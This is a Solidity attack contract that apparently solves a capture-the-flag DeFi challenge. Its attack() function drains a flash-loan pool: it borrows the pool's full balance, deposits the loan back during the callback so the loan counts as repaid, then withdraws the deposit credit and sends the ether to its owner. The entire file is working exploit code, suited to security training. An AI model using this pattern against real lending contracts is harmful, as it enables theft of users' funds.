// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';
import "solady/src/utils/SafeTransferLib.sol";
import { SideEntranceLenderPool, IFlashLoanEtherReceiver } from "./SideEntranceLenderPool.sol";

contract SideEntranceAttack is Ownable, IFlashLoanEtherReceiver {

    SideEntranceLenderPool private pool;

    constructor (address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function attack() public onlyOwner {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
    }

    receive() external payable {}

}